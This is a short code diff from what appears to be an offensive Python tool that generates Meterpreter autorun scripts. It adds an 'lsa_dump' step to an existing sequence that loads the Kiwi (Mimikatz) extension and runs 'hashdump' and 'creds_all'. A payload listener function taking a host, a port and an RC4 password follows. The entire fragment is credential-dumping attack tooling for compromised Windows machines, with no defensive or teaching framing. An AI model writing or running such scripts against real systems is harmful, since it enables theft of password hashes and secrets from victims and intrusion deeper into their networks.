@@ -52,7 +52,8 @@ def autorunscript():
 				 "load kiwi\n"+\
 				 "sysinfo\n"+\
 				 "hashdump\n"+\
-				 "creds_all")
+				 "creds_all\n"+\
+                 "lsa_dump")
 
 def listener(msfPayload,lhost,lport,rc4Password, msflistenerChoice): 
 	on = set(['on','yes', 'ye', ''])
